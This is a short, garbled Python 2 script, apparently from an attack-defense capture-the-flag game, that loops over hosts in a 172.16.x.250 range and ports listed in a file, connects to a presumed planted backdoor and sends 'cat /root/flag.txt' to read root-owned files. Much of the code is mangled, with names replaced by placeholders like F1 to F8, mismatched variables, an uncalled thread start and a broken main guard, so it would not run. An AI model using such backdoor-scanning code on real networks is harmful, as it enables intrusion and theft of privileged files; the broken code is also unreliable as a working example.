from F1 import *
import F2,F5,os

def Connect_Backdorr_horse(i,j):
        try:
                s=F1(AF_INET,SOCK_STREAM)
                IP='172.16.'+F3+'.250'
                s.connect((ip,j))
                s.send('cat /root/flag.txt\n')
                m=s.recv(1024)
                print ip,m
                s.close()
        except:
                 pass

def loop():
         for i in F4(1.254):
                        f=open('port','r')
                        m=f.F6()
                        for j in m:
                                  j= j.strip()
                                  t=F2.Thread(target=F7,args=(i,int(j)))
                                  t.start
                                  F5(time).sleep(0.1)
            os.F8(0)

if_name_='_main_':    
     loop()
                    
